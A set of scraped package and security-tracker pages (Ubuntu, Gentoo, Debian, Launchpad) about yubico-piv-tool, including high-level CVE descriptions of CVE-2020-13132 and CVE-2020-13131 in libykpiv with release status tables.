In these regular emails you will find the latest updates about
Ubuntu and upcoming events where you can meet our team.*Close*

Your preferences have been successfully updated. *Close*

[Canonical Ubuntu](/)

* [Menu](/navigation)

* [Products](/navigation#products-navigation)
* [Use cases](/navigation#use-case-navigation)
* [Support](/navigation#support-navigation)
* [Community](/navigation#community-navigation)
* [Get Ubuntu](/navigation#get-ubuntu-navigation)

[![](https://assets.ubuntu.com/v1/82818827-CoF_white.svg)

Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

# CVE-2020-13132

Publication date 9 July 2020

Last updated 24 July 2024

---

Ubuntu priority

![](https://assets.ubuntu.com/v1/8010f9e0-CVE-Priority-icon-Medium.svg)

**Medium**

[Why this priority?](/security/cves/about#priority )

## Cvss 3 Severity Score

![](https://assets.ubuntu.com/v1/8010f9e0-CVE-Priority-icon-Medium.svg)

**4.6 · Medium**

[Score breakdown](#impact-score)

Toggle side navigation

Toggle table of contents

* [Description](#description)
* [Status](#status)
* [Severity score breakdown](#impact-score)
* [References](#references)

An issue was discovered in Yubico libykpiv before 2.1.0. An attacker can
trigger an incorrect free() in the ykpiv\_util\_generate\_key() function in
lib/util.c through incorrect error handling code. This could be used to
cause a denial of service attack.

## Status

Show unmaintained releases

| Package | Ubuntu Release | Status |
| --- | --- | --- |
| yubico-piv-tool | 24.10 oracular | Not affected |
| 24.04 LTS noble | Not affected |
| 23.10 mantic | Not affected |
| 23.04 lunar | Not affected |
| 22.10 kinetic | Not affected |
| 22.04 LTS jammy | Not affected |
| 21.10 impish | Not affected |
| 21.04 hirsute | Not affected |
| 20.10 groovy | Ignored end of life |
| 20.04 LTS focal | Needs evaluation |
| 19.10 eoan | Ignored end of life |
| 18.04 LTS bionic | Needs evaluation |
| 16.04 LTS xenial | Needs evaluation |
| 14.04 LTS trusty | Not in release |

---

* [How can I get the fixes?](/security/cves/about#security)
* [What do statuses mean?](/security/cves/about#statuses)

## Severity score breakdown

| Parameter | Value |
| --- | --- |
| Base score | 4.6 · Medium |
| Attack vector | Physical |
| Attack complexity | Low |
| Privileges required | None |
| User interaction | None |
| Scope | Unchanged |
| Confidentiality | None |
| Integrity impact | None |
| Availability impact | High |
| Vector | CVSS:3.1/AV:P/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H |

## References

* [MITRE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-13132)
* [NVD](https://nvd.nist.gov/vuln/detail/CVE-2020-13132)
* [Launchpad](https://launchpad.net/bugs/cve/CVE-2020-13132)
* [Debian](https://security-tracker.debian.org/tracker/CVE-2020-13132)

### Other references

* <https://blog.inhq.net/posts/yubico-libykpiv-vuln/>
* <https://www.yubico.com/support/security-advisories/ysa-2020-02/>
* <https://www.cve.org/CVERecord?id=CVE-2020-13132>

---

## [OpenStack](/openstack) [OpenStack](/openstack)

* [What is OpenStack](/openstack/what-is-openstack)
* [Features](/openstack/features)
* [Managed](/openstack/managed)
* [Consulting](/openstack/consulting)
* [Install](/openstack/install)
* [Support](/openstack/support)

---

## [Ceph](/ceph) [Ceph](/ceph)

* [What is Ceph](/ceph/what-is-ceph)
* [Managed](/ceph/managed)
* [Consulting](/ceph/consulting)
* [Docs](/ceph/docs)
* [Install](/ceph/install)

---

## [Kubernetes](/kubernetes) [Kubernetes](/kubernetes)

* [What is Kubernetes](/kubernetes/what-is-kubernetes)
* [Charmed Kubernetes](/kubernetes/charmed-k8s)
* [Managed](/kubernetes/managed)
* [Install](/kubernetes/install)
* [Docs](/kubernetes/docs)
* [Resources](/kubernetes/resources)

---

## [Managed Services](/managed) [Managed Services](/managed)

* [OpenStack](/openstack/managed)
* [Kubernetes](/kubernetes/managed)
* [Ceph](/ceph/managed)
* [Apps](/managed/apps)
* [Observability](/observability/managed)
* [Firefighting](/managed/firefighting-support)

---

## [AI / ML](/ai) [AI / ML](/ai)

* [MLOps](/ai/mlops)
* [Kubeflow](/ai/what-is-kubeflow)
* [MLflow](/ai/mlflow)
* [Consulting](/ai/consulting)
* [Data Science](/ai/data-science)
* [MLOps workshop](/ai/mlops-workshop)

---

## [Robotics](/robotics) [Robotics](/robotics)

* [What is ROS](/robotics/what-is-ros)
* [ROS ESM](/robotics/ros-esm)
* [Community](/robotics/community)
* [Docs](/robotics/docs)

---

## [IoT](/internet-of-things) [IoT](/internet-of-things)

* [App store](/internet-of-things/appstore)
* [Embedded Linux](/embedded)
* [Management](/internet-of-things/management)

---

## [Ubuntu Core](/core) [Ubuntu Core](/core)

* [Features](/core/features)
* [Success stories](/core/stories)
* [Services](/core/services)
* [Docs](/core/docs)

---

## [Ubuntu Desktop](/desktop) [Ubuntu Desktop](/desktop)

* [Organisations](/desktop/organisations)
* [Developers](/desktop/developers)
* [Flavours](/desktop/flavours)
* [WSL](/desktop/wsl)

---

## [Ubuntu Server](/server) [Ubuntu Server](/server)

* [Hyperscale](/server/hyperscale)
* [Docs](/server/docs)

---

## [Cloud](/cloud) [Cloud](/cloud)

* [What is cloud computing](/cloud/cloud-computing)
* [What is private cloud](/cloud/private-cloud)
* [What is hybrid cloud](/cloud/hybrid-cloud)
* [What is multi-cloud](/cloud/multi-cloud)
* [Public cloud](/cloud/public-cloud)

---

## [Security](/security) [Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

---

## [Landscape](/landscape) [Landscape](/landscape)

* [Features](/landscape/features)
* [Managed](/landscape/managed)
* [Compare](/landscape/compare)
* [Install](/landscape/docs/quickstart-deployment)
* [Docs](/landscape/docs)
* [Log in to Landscape](https://landscape.canonical.com/)

---

## [Containers](/containers) [Containers](/containers)

* [What are containers](/containers/what-are-containers)
* [Chiseled Ubuntu](/containers/chiseled)
* [Chiseled and .NET](/containers/chiseled/dotnet)

---

## [Downloads](/download) [Downloads](/download)

* [Desktop](/download/desktop)
* [Server](/download/server)
* [Core](/download/core)
* [Cloud](/download/cloud)

---

## [Support](/support) [Support](/support)

* [Your subscriptions](/pro/dashboard)
* [Account users](/pro/users)
* [Pricing](/pricing/pro)
* [Discourse](https://discourse.ubuntu.com/c/project/ubuntu-pro/116/)

---

## [Observability](/observability) [Observability](/observability)

* [What is observability](/observability/what-is-observability)
* [Managed](/observability/managed)

---

## [Pricing](/pricing) [Pricing](/pricing)

* [Consulting](/pricing/consulting)
* [Desktops](/pricing/desktop)
* [Devices](/pricing/devices)

---

## Solutions

* [AI](https://canonical.com/solutions/ai)
* [Data](https://canonical.com/data)
* [Infrastructure](https://canonical.com/solutions/infrastructure)
* [Secure open source](https://canonical.com/solutions/secure-open-source)

---

## Sectors

* [Automotive](/automotive)
* [Industrial](/industrial)
* [Government](/gov)
* [Telco](/telco)
* [Finance](/financial-services)

---

[Contact us](/contact-us)

* [About us](/about)
* [Community](/community)
* [Careers](https://www.canonical.com/careers)
* [Blog](/blog)
* [Resources](/engage)
* [Press centre](/blog/press-centre)

---

© 2025 Canonical Ltd.

Ubuntu and Canonical are registered trademarks of Canonical Ltd.

---

* [Legal information](/legal)
* [Data privacy](/legal/data-privacy)
* Manage your tracker settings
* [Report a bug on this site](https://github.com/canonical/ubuntu.com/issues/new?template=ISSUE_TEMPLATE.yaml)

Back to top

Go to the top of the page



=== Content from packages.gentoo.org_c922a487_20250119_135245.html ===
[![Gentoo](https://assets.gentoo.org/tyrian/site-logo.png)](/ "Back to the homepage") Packages [**Get Gentoo!**](https://get.gentoo.org/)gentoo.org sites [gentoo.org](https://www.gentoo.org/ "Main Gentoo website")  [Wiki](https://wiki.gentoo.org/ "Find and contribute documentation")  [Bugs](https://bugs.gentoo.org/ "Report issues and find common issues")  [Forums](https://forums.gentoo.org/ "Discuss with the community")  [Packages](https://packages.gentoo.org/ "Find software for your Gentoo") [Planet](https://planet.gentoo.org/ "Find out what's going on in the developer community")  [Archives](https://archives.gentoo.org/ "Read up on past discussions")  [Sources](https://sources.gentoo.org/ "Browse our source code") [Infra Status](https://infra-status.gentoo.org/ "Get updates on the services provided by Gentoo")

* [Home](/)
* [Packages](/categories)
* [Maintainers](/maintainers)
* [USE flags](/useflags)
* [Architectures](/arches)
* [About](/about)

# [sys-auth](/categories/sys-auth)/yubico-piv-tool

Command-line tool and p11-kit module for the YubiKey PIV application

<https://developers.yubico.com/yubico-piv-tool/>

 [Overview](/packages/sys-auth/yubico-piv-tool)  [Dependencies](/packages/sys-auth/yubico-piv-tool/dependencies)  [QA report](/packages/sys-auth/yubico-piv-tool/qa-report)  [Pull requests 1](/packages/sys-auth/yubico-piv-tool/pull-requests) [Bugs 0](/packages/sys-auth/yubico-piv-tool/bugs) [Security 0](/packages/sys-auth/yubico-piv-tool/security) [Changelog](/packages/sys-auth/yubico-piv-tool/changelog)  **Version 2.7.1 is available upstream. Please consider updating!**
It seems that version 2.7.1 is available upstream, while the latest version in the Gentoo tree is 2.6.1.
*You think this warning is false? Read more about it [here](https://archives.gentoo.org/gentoo-dev/message/b793f4da5a5b5e20a063ea431500a820).*
### Available Versions

| Version | amd64 | x86 | alpha | arm | arm64 | hppa | mips | ppc | ppc64 | riscv | sparc |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| **[2.6.1](https://gitweb.gentoo.org/repo/gentoo.git/tree/sys-auth/yubico-piv-tool/yubico-piv-tool-2.6.1.ebuild)**  : 0/2 EAPI 8 | amd64 | ?x86 | ?alpha | ?arm | ~arm64 | ?hppa | ?mips | ?ppc | ?ppc64 | ~riscv | ?sparc |
| **[2.6.0](https://gitweb.gentoo.org/repo/gentoo.git/tree/sys-auth/yubico-piv-tool/yubico-piv-tool-2.6.0.ebuild)**  : 0/2 EAPI 8 | amd64 | ?x86 | ?alpha | ?arm | ~arm64 | ?hppa | ?mips | ?ppc | ?ppc64 | ~riscv | ?sparc |

### Package Metadata

* Other homepage(s) <https://github.com/Yubico/yubico-piv-tool>
* Upstream

  | Remote-Id | <https://github.com/Yubico/yubico-piv-tool> |
  | --- | --- |
* USE flagsGlobal Use Flags
  + [test](/useflags/test "Enable dependencies and/or preparations necessary to run tests (usually controlled by FEATURES=test but can be toggled independently)")
  + [verify-sig](/useflags/verify-sig "Verify upstream signatures on distfiles")
* LicenseBSD-2
* Maintainer(s) [Mario Haustein](/maintainer/mario.haustein%40hrz.tu-chemnitz.de "Mario Haustein") ,  [Proxy Maintainers](/maintainer/proxy-maint%40gentoo.org "Proxy Maintainers")
#### [External Resources](#collapseExternalResources)

 [Related bugs](https://bugs.gentoo.org/buglist.cgi?quicksearch=sys-auth/yubico-piv-tool) [CI Report](https://qa-reports.gentoo.org/output/gentoo-ci/output.html;pkg=sys-auth:yubico-piv-tool "CI report") ([verbose](https://qa-reports.gentoo.org/output/gentoo-ci/output.verbose.html;pkg=sys-auth:yubico-piv-tool "Verbose CI report")) [Repology](https://repology.org/tools/project-by?repo=gentoo&name_type=srcname&target_page=project_versions&name=sys-auth/yubico-piv-tool) [Open Pull Requests](https://github.com/gentoo/gentoo/pulls?q=is%3Apr+is%3Aopen+in%3Atitle+sys-auth/yubico-piv-tool) [Documentation](https://wiki.gentoo.org/wiki/Special%3ASearch/yubico-piv-tool) [Forums posts](https://forums.gentoo.org/search.php?search_terms=all&show_results=topics&search_keywords=yubico-piv-tool&mode=results) [Git repository browser](https://gitweb.gentoo.org/repo/gentoo.git/tree/sys-auth/yubico-piv-tool) [Git log](https://gitweb.gentoo.org/repo/gentoo.git/log/sys-auth/yubico-piv-tool?showmsg=1 "Git log") ([short](https://gitweb.gentoo.org/repo/gentoo.git/log/sys-auth/yubico-piv-tool "Short git log")) [Changes Feed](https://gitweb.gentoo.org/repo/gentoo.git/atom/sys-auth/yubico-piv-tool?h=master)

**© 2001–2024 Gentoo Authors**
Gentoo is a trademark of the Gentoo Foundation, Inc. and of Förderverein Gentoo e.V. The contents of this document, unless otherwise expressly stated, are licensed under the [CC-BY-SA-4.0](https://creativecommons.org/licenses/by-sa/4.0/) license. The [Gentoo Name and Logo Usage Guidelines](https://www.gentoo.org/inside-gentoo/foundation/name-logo-guidelines.html) apply.**[Contact](https://www.gentoo.org/inside-gentoo/contact/)**
v1.0.3

=== Content from packages.debian.org_76a26c30_20250119_135236.html ===


[![Debian](/Pics/openlogo-50.png)](https://www.debian.org/)

[skip the navigation](#inner)

[Packages](/)

* [About Debian](https://www.debian.org/intro/about)
* [Getting Debian](https://www.debian.org/distrib/)
* [Support](https://www.debian.org/support)
* [Developers' Corner](https://www.debian.org/devel/)

 / [Packages](/ "Debian Packages Homepage")
/ [bullseye (oldstable)](/bullseye/ "Overview over this suite")
/ [Source](/source/bullseye/ "Source packages")
/ [misc](/source/bullseye/misc/ "All packages in this section")
/ yubico-piv-tool

package names
descriptions
source package names
package contents

[all options](/)

 [  **bullseye**  ]
[  [bookworm](/source/bookworm/yubico-piv-tool)  ]
[  [trixie](/source/trixie/yubico-piv-tool)  ]
[  [sid](/source/sid/yubico-piv-tool)  ]
# Source Package: yubico-piv-tool (2.2.0-1)

## Links for yubico-piv-tool

### Debian Resources:

* [Bug Reports](https://bugs.debian.org/src%3Ayubico-piv-tool)
* [Developer Information](https://tracker.debian.org/yubico-piv-tool)
* [Debian Changelog](https://metadata.ftp-master.debian.org/changelogs//main/y/yubico-piv-tool/yubico-piv-tool_2.2.0-1_changelog)
* [Copyright File](https://metadata.ftp-master.debian.org/changelogs//main/y/yubico-piv-tool/yubico-piv-tool_2.2.0-1_copyright)
* [Debian Source Repository](https://salsa.debian.org/auth-team/yubico-piv-tool)
  ([Git](https://salsa.debian.org/auth-team/yubico-piv-tool.git))
* [Debian Patch Tracker](https://sources.debian.org/patches/yubico-piv-tool/2.2.0-1/)

### Maintainers:

* Debian Authentication Maintainers
  ([QA Page](https://qa.debian.org/developer.php?login=pkg-auth-maintainers%40lists.alioth.debian.org "An overview over the maintainer's packages and uploads"), [Mail Archive](https://lists.alioth.debian.org/pipermail/pkg-auth-maintainers/ "Archive of the Maintainer Mailinglist"))
* Alessio Di Mauro
  ([QA Page](https://qa.debian.org/developer.php?login=alessio%40yubico.com "An overview over the maintainer's packages and uploads"))
* Dain Nilsson
  ([QA Page](https://qa.debian.org/developer.php?login=dain%40yubico.com "An overview over the maintainer's packages and uploads"))
* Klas Lindfors
  ([QA Page](https://qa.debian.org/developer.php?login=klas%40yubico.com "An overview over the maintainer's packages and uploads"))
* nicoo
  ([QA Page](https://qa.debian.org/developer.php?login=nicoo%40debian.org "An overview over the maintainer's packages and uploads"))

### External Resources:

* [Homepage](https://developers.yubico.com/yubico-piv-tool/) [developers.yubico.com]

The following binary packages are built from this source package:
[libykpiv-dev](/bullseye/libykpiv-dev)
Development files for the YubiKey PIV Library
[libykpiv2](/bullseye/libykpiv2)
Library for communication with the YubiKey PIV smartcard
[ykcs11](/bullseye/ykcs11)
PKCS#11 module for the YubiKey PIV applet
[yubico-piv-tool](/bullseye/yubico-piv-tool)
Command line tool for the YubiKey PIV applet

## Other Packages Related to yubico-piv-tool

| * build-depends | * build-depends-indep |
| --- | --- |

* adep:
  debhelper-compat
  (= 13)
   Package not available

  * adep:
    [cmake](/bullseye/cmake)
     cross-platform, open-source make system

    * adep:
      [pkg-config](/bullseye/pkg-config)
       manage compile and link flags for libraries

      * adep:
        [check](/bullseye/check)
         unit test framework for C

        * adep:
          [gengetopt](/bullseye/gengetopt)
           skeleton main.c generator

          * adep:
            [help2man](/bullseye/help2man)
             Automatic manpage generator

            * adep:
              [libpcsclite-dev](/bullseye/libpcsclite-dev)
               Middleware to access a smart card using PC/SC (development files)

              * adep:
                [libssl-dev](/bullseye/libssl-dev)
                 Secure Sockets Layer toolkit - development files

## Download yubico-piv-tool

| File | Size (in kB) | MD5 checksum |
| --- | --- | --- |
| [yubico-piv-tool\_2.2.0-1.dsc](http://deb.debian.org/debian/pool/main/y/yubico-piv-tool/yubico-piv-tool_2.2.0-1.dsc) | 2.5 kB | b4ba8ac407ee3022362c0cf9cdc77a82 |
| [yubico-piv-tool\_2.2.0.orig.tar.gz](http://deb.debian.org/debian/pool/main/y/yubico-piv-tool/yubico-piv-tool_2.2.0.orig.tar.gz) | 1,290.7 kB | aa71993a96f483cfbec3f9ba717d9fc6 |
| [yubico-piv-tool\_2.2.0.orig.tar.gz.asc](http://deb.debian.org/debian/pool/main/y/yubico-piv-tool/yubico-piv-tool_2.2.0.orig.tar.gz.asc) | 0.8 kB | f4a4e0a8acd85897a36494b8025b7a48 |
| [yubico-piv-tool\_2.2.0-1.debian.tar.xz](http://deb.debian.org/debian/pool/main/y/yubico-piv-tool/yubico-piv-tool_2.2.0-1.debian.tar.xz) | 72.7 kB | aaa6a0408eeda36746ae30dc4e346dbb |

Debian Package Source Repository (VCS: [Git](/bullseye/git-core))
<https://salsa.debian.org/auth-team/yubico-piv-tool.git>
Debian Package Source Repository (Browsable)
<https://salsa.debian.org/auth-team/yubico-piv-tool>

---

This page is also available in the following languages (How to set [the default document language](https://www.debian.org/intro/cn)):

[Български (Bəlgarski)](/bg/source/bullseye/yubico-piv-tool "Bulgarian")
[Deutsch](/de/source/bullseye/yubico-piv-tool "German")
[suomi](/fi/source/bullseye/yubico-piv-tool "Finnish")
[français](/fr/source/bullseye/yubico-piv-tool "French")
[magyar](/hu/source/bullseye/yubico-piv-tool "Hungarian")
[日本語 (Nihongo)](/ja/source/bullseye/yubico-piv-tool "Japanese")
[Nederlands](/nl/source/bullseye/yubico-piv-tool "Dutch")
[polski](/pl/source/bullseye/yubico-piv-tool "Polish")
[Русский (Russkij)](/ru/source/bullseye/yubico-piv-tool "Russian")
[slovensky](/sk/source/bullseye/yubico-piv-tool "Slovak")
[svenska](/sv/source/bullseye/yubico-piv-tool "Swedish")
[Türkçe](/tr/source/bullseye/yubico-piv-tool "Turkish")
[українська (ukrajins'ka)](/uk/source/bullseye/yubico-piv-tool "Ukrainian")
[中文 (Zhongwen,简)](/zh-cn/source/bullseye/yubico-piv-tool "Chinese (China)")
[中文 (Zhongwen,繁)](/zh-tw/source/bullseye/yubico-piv-tool "Chinese (Taiwan)")

---

See our [contact page](https://www.debian.org/contact) to get in touch.

Content Copyright © 1997 - 2025 [SPI Inc.](https://www.spi-inc.org/); See [license terms](https://www.debian.org/license). Debian is a [trademark](https://www.debian.org/trademark) of SPI Inc.
[Learn more about this site](/about/).

This service is sponsored by [University of Helsinki - Department of Computer Science](http://cs.helsinki.fi/index.en.html).



=== Content from launchpad.net_e7e52f6c_20250119_135239.html ===

[Log in / Register](https://launchpad.net/ubuntu/%2Bsource/yubico-piv-tool/%2Blogin)

[![](https://launchpadlibrarian.net/606381979/CoF%2064px.png)](https://launchpad.net/ubuntu)

## [Ubuntu](https://launchpad.net/ubuntu)[yubico-piv-tool package](https://launchpad.net/ubuntu/%2Bsource/yubico-piv-tool)

* Overview
* [Code](https://code.launchpad.net/ubuntu/%2Bsource/yubico-piv-tool)
* [Bugs](https://bugs.launchpad.net/ubuntu/%2Bsource/yubico-piv-tool)
* Blueprints
* [Translations](https://translations.launchpad.net/ubuntu/%2Bsource/yubico-piv-tool)
* [Answers](https://answers.launchpad.net/ubuntu/%2Bsource/yubico-piv-tool)

# yubico-piv-tool package in Ubuntu

libykpiv-dev: Development files for the YubiKey PIV Library

libykpiv2: Library for communication with the YubiKey PIV smartcard

libykpiv2-dbgsym: debug symbols for libykpiv2

ykcs11: PKCS#11 module for the YubiKey PIV applet

ykcs11-dbgsym: debug symbols for ykcs11

yubico-piv-tool: Command line tool for the YubiKey PIV applet

yubico-piv-tool-dbgsym: debug symbols for yubico-piv-tool

This package has
[0 new
bugs](https://bugs.launchpad.net/ubuntu/%2Bsource/yubico-piv-tool/%2Bbugs?field.status:list=NEW)
and
[0 open
questions.](https://answers.launchpad.net/ubuntu/%2Bsource/yubico-piv-tool/%2Bquestions?field.status=OPEN)

## Package information

Maintainer:
[Debian Authentication Maintainers](/~pkg-auth-maintainers)

Urgency:\*
Medium Urgency

Architectures:\*
any

Latest upload:
[2.5.2-1](/ubuntu/%2Bsource/yubico-piv-tool/2.5.2-1)

\*actual publishing details may vary in this distribution, these are just the package defaults.

## Upstream connections

Launchpad doesn’t know which project and series this
package belongs to. Links from distribution packages to
upstream project let distribution and upstream
maintainers share bugs, patches, and translations
efficiently.

There are no projects registered in Launchpad that are a potential
match for this source package. Can you help us find one?

| Registered upstream project:  Choose another upstream project Register the upstream project | |
| --- | --- |

| [The Plucky Puffin](/ubuntu/plucky/%2Bsource/yubico-piv-tool) (active development) | | |
| --- | --- | --- |
| [2.5.2-1](/ubuntu/%2Bsource/yubico-piv-tool/2.5.2-1) | release (universe) | 2024-10-17 |
|  | | |
|  | | |
| [The Oracular Oriole](/ubuntu/oracular/%2Bsource/yubico-piv-tool) (current stable release) | | |
| [2.5.2-1](/ubuntu/%2Bsource/yubico-piv-tool/2.5.2-1) | release (universe) | 2024-05-17 |
|  | | |
|  | | |
| [The Noble Numbat](/ubuntu/noble/%2Bsource/yubico-piv-tool) (supported) | | |
| [2.2.0-1.1build2](/ubuntu/%2Bsource/yubico-piv-tool/2.2.0-1.1build2) | release (universe) | 2024-04-04 |
|  | | |
|  | | |
| [The Jammy Jellyfish](/ubuntu/jammy/%2Bsource/yubico-piv-tool) (supported) | | |
| [2.2.0-1ubuntu1](/ubuntu/%2Bsource/yubico-piv-tool/2.2.0-1ubuntu1) | release (universe) | 2021-12-08 |
|  | | |
|  | | |
| [The Focal Fossa](/ubuntu/focal/%2Bsource/yubico-piv-tool) (supported) | | |
| [2.0.0-2](/ubuntu/%2Bsource/yubico-piv-tool/2.0.0-2) | release (universe) | 2020-02-16 |
|  | | |
|  | | |
| [The Bionic Beaver](/ubuntu/bionic/%2Bsource/yubico-piv-tool) (supported) | | |
| [1.4.2-2ubuntu0.1](/ubuntu/%2Bsource/yubico-piv-tool/1.4.2-2ubuntu0.1) | security, updates (universe) | 2020-02-11 |
|  | | |
| [1.4.2-2](/ubuntu/%2Bsource/yubico-piv-tool/1.4.2-2) | release (universe) | 2017-10-24 |
|  | | |
|  | | |
| [The Xenial Xerus](/ubuntu/xenial/%2Bsource/yubico-piv-tool) (supported) | | |
| [1.0.3-1](/ubuntu/%2Bsource/yubico-piv-tool/1.0.3-1) | release (universe) | 2015-10-27 |
|  | | |
|  | | |

Other versions of 'yubico-piv-tool' in untrusted
archives.

The following **unsupported** and
**untrusted** Personal Archives (PPAs) provide
packages of
'yubico-piv-tool':

[![[PPA Archive]](/@@/ppa-icon "PPA Archive")
Guardian Project PPA](/~guardianproject/%2Barchive/ubuntu/ppa) owned by
[Guardian Project](/~guardianproject)

Versions:
Precise (0.1.5-1~precise), Trusty (0.1.5-1~trusty), Utopic (0.1.5-1~utopic), Vivid (0.1.5-1~vivid)

[![[PPA Archive]](/@@/ppa-icon "PPA Archive")
Yubico stable software](/~yubico/%2Barchive/ubuntu/stable) owned by
[Yubico](/~yubico)

Versions:
Quantal (0.0.2-1~ppa1~quantal1), Saucy (0.0.3-1~ppa1~saucy1), Utopic (1.0.1-1~ppa2~utopic1), Vivid (1.2.2-1~ppa1~vivid1), Wily (1.4.0-1~ppa1~wily1), Precise (1.4.3-1~ppa1~precise1), Yakkety (1.4.3-1~ppa1~yakkety1), Zesty (1.5.0-1~ppa2~zesty1), Artful (1.5.0-1~ppa2~artful1), Cosmic (1.7.0-1~ppa1~cosmic1), Disco (1.7.0-1~ppa1~disco1), Eoan (2.1.1~ppa1~eoan1), Trusty (2.2.0~ppa1~trusty1), Groovy (2.2.0~ppa1~groovy1), Hirsute (2.2.1~ppa1~hirsute1), Impish (2.3.0~ppa1~impish1), Kinetic (2.3.1~ppa2~kinetic1), Lunar (2.4.1~ppa1~lunar1), Mantic (2.5.2~ppa1~mantic1), Xenial (2.6.0~ppa1~xenial1), Bionic (2.7.0~ppa1~bionic1), Focal (2.7.0~ppa1~focal1), Jammy (2.7.0~ppa1~jammy1), Noble (2.7.0~ppa1~noble1), Oracular (2.7.0~ppa1~oracular1)

You can also search for
[other untrusted versions of
'yubico-piv-tool'](https://launchpad.net/ubuntu/%2Bppas?name_filter=yubico-piv-tool).

* [View full publishing history](https://launchpad.net/ubuntu/%2Bsource/yubico-piv-tool/%2Bpublishinghistory)
* [View full change log](https://launchpad.net/ubuntu/%2Bsource/yubico-piv-tool/%2Bchangelog)

## Get Involved

* [Report a bug](https://bugs.launchpad.net/ubuntu/%2Bsource/yubico-piv-tool/%2Bfilebug)
* [Ask a question](https://answers.launchpad.net/ubuntu/%2Bsource/yubico-piv-tool/%2Baddquestion)

## Subscribers

**To all bugs in yubico-piv-tool in Ubuntu**:

* [Craig Miller](/~craigmiller)

**To all Ubuntu bugs**:

* [Alejandro J. Alvarez S.](/~alvarez-ciencia)
* [Andreas Hasenack](/~ahasenack)
* [Ashani Holland](/~shani2k8)
* [Barry Warsaw](/~barry)
* [Brian Murray](/~brian-murray)
* [Bruno Garcia](/~bruno2112)
* [CRC](/~crc-error-mail)
* [Charlie\_Smotherman](/~cjsmo)
* [Chris Halse Rogers](/~raof)
* [Christian Ehrhardt](/~paelzer)
* [Dave Chiluk](/~chiluk)
* [Dave Jones](/~waveform)
* [David Fernandez Gonzalez](/~litios)
* [Debian PTS](/~debianpts)
* [Didier Roche-Tolomelli](/~didrocks)
* [Dimitri John Ledkov](/~xnox)
* [Doraann2](/~barkerashley36)
* [Franko Fang](/~huananhu)
* [HaySayCheese](/~haysaycheese)
* [Hidagawa](/~hidagawa)
* [Iain Lane](/~laney)
* [Jeff Lane ](/~bladernr)
* [Jeff Marcom](/~jeffmarcom)
* [Jeremy Bícha](/~jbicha)
* [Jesse Jones](/~jesse-jones123)
* [José Alfonso](/~ftprj45-deactivatedaccount)
* [Matt j](/~ja3k3l)
* [Mr. MInhaj](/~imhell99)
* [Name Changed](/~b1130560)
* [PCTeacher012](/~pcfixupllc)
* [Paolo Topa](/~donkavo)
* [Peter Bullert](/~skyluc00mind)
* [Philip Muškovac](/~yofel)
* [Punnsa](/~anubhavgupta1990)
* [Rafael David Tinoco](/~rafaeldtinoco)
* [Richard Seguin](/~b-launchpad-transubuntu-ca)
* [Richard Williams](/~rkwill)
* [Robie Basak](/~racb)
* [Simon Chopin](/~schopin)
* [Skia](/~hyask)
* [Steve Langasek](/~vorlon)
* [Tom Weiss](/~thomas-r-weiss)
* [Ubuntu Bugs](/~ubuntu-bugs)
* [Ubuntu Security Team](/~ubuntu-security)
* [Vasanth](/~mail-vasanth)
* [Vic Parker](/~v-parker2)
* [Zygmunt Krynicki](/~zyga)
* [ahepas](/~zzou)
* [basilisgabri](/~vgavrilubuntu)
* [dsfkj dfjx](/~geawaifr)
* [eoininmoran](/~eoininmoran)
* [ganesh](/~ganeshredcobra)
* [linuxgijs](/~gi--js)
* [nikonikic42](/~nikonikic42)
* [projevie@hotmail.com](/~projevie)
* [qadir](/~juniorlhkaceh)
* [sankaran](/~payyoormana)
* [van](/~angeles-van-deactivatedaccount)

[![Launchpad](/@@/launchpad-footer-logo.svg)](https://launchpad.net/)
 •
[Take the tour](https://launchpad.net/%2Btour)
 •
[Read the guide](https://help.launchpad.net/)

© 2004
[Canonical Ltd.](http://canonical.com/)
 •
[Terms of use](https://launchpad.net/legal)
 •
[Data privacy](https://www.ubuntu.com/legal/dataprivacy)
 •
[Contact Launchpad Support](/feedback)
 •
[Blog](http://blog.launchpad.net/)
 •
[Careers](https://canonical.com/careers)
 •
[System status](https://ubuntu.social/%40launchpadstatus)
 •
6394e03
([Get the code!](https://dev.launchpad.net/))



=== Content from security-tracker.debian.org_c52142e6_20250119_135245.html ===

# CVE-2020-13131

| **Name** | CVE-2020-13131 |
| --- | --- |
| **Description** | An issue was discovered in Yubico libykpiv before 2.1.0. lib/util.c in this library (which is included in yubico-piv-tool) does not properly check embedded length fields during device communication. A malicious PIV token can misreport the returned length fields during RSA key generation. This will cause stack memory to be copied into heap allocated memory that gets returned to the caller. The leaked memory could include PINs, passwords, key material, and other sensitive information depending on the integration. During further processing by the caller, this information could leak across trust boundaries. Note that RSA key generation is triggered by the host and cannot directly be triggered by the token. |
| **Source** | [CVE](https://www.cve.org/CVERecord?id=CVE-2020-13131) (at [NVD](https://nvd.nist.gov/vuln/detail/CVE-2020-13131); [CERT](https://www.kb.cert.org/vuls/byid?searchview=&query=CVE-2020-13131), [LWN](https://lwn.net/Search/DoSearch?words=CVE-2020-13131), [oss-sec](https://marc.info/?l=oss-security&s=CVE-2020-13131), [fulldisc](https://marc.info/?l=full-disclosure&s=CVE-2020-13131), [Red Hat](https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2020-13131), [Ubuntu](https://people.canonical.com/~ubuntu-security/cve/CVE-2020-13131), [Gentoo](https://bugs.gentoo.org/show_bug.cgi?id=CVE-2020-13131), SUSE [bugzilla](https://bugzilla.suse.com/show_bug.cgi?id=CVE-2020-13131)/[CVE](https://www.suse.com/security/cve/CVE-2020-13131/), GitHub [advisories](https://github.com/advisories?query=CVE-2020-13131)/[code](https://github.com/search?type=Code&q=%22CVE-2020-13131%22)/[issues](https://github.com/search?type=Issues&q=%22CVE-2020-13131%22), [web search](https://duckduckgo.com/html?q=%22CVE-2020-13131%22), [more](https://oss-security.openwall.org/wiki/vendors)) |
| **Debian Bugs** | [975612](https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=975612) |

## Vulnerable and fixed packages

The table below lists information on source packages.

| Source Package | Release | Version | Status |
| --- | --- | --- | --- |
